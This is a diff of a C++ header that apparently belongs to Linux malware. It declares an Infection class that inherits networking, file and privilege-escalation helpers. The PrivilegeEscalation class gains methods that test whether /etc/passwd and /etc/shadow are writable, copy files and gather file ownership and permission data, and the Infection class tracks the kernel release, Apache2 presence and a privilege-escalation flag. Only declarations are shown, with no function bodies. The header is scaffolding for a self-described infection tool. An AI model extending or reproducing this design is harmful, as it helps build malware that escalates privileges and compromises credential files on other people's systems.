@@ -3,8 +3,12 @@
 #include <fstream>
 #include <stdlib.h>
 #include <cstring>
-#include <string>
+#include <string.h>
+//#include <string>
+#include <pwd.h>
+#include <grp.h>
 #include <sys/types.h>
+#include <sys/utsname.h>
 #include <vector>
 #include <sys/stat.h>
 #include <ifaddrs.h>
@@ -16,11 +20,13 @@
 #pragma once
 
 struct FileInformations{
-	const char* fileName;
+	std::string fileNameAndDir;
+	std::string fileUserOwner;
+	std::string fileGroupOwner;
 	int fileSize;
 	int fileLinks;
 	int fileiNode;
-	char filePermissions[];
+	std::string filePermissions;
 };
 
 class FileUtilities{
@@ -37,8 +43,14 @@ struct Adapters {
 	std::string LocalIPAddress;
 };
 
-class PrivilegeEscalation{
 
+class PrivilegeEscalation{
+public:
+	bool checkDir(std::string fileName, bool createFile);
+	bool isEtcPasswdWriteable();
+	bool isEtcShadowWriteable();
+	bool copyFile(std::string destination, std::string source);
+	FileInformations GetFileInformations(const char* fileName);
 };
 
 class Networking {
@@ -47,10 +59,10 @@ public:
 	void enumerateAdapters();
 };
 
-class Infection : public Networking, public FileUtilities, public PrivilegeEscalation {
+class Infection : public Networking, public FileUtilities, PrivilegeEscalation {
 private:
 	//Variables
-	char* user;
+	std::string user;
 	bool isApache2Present;
 	char* KernelRelease;
 	bool tryPrivilegeEscalation;
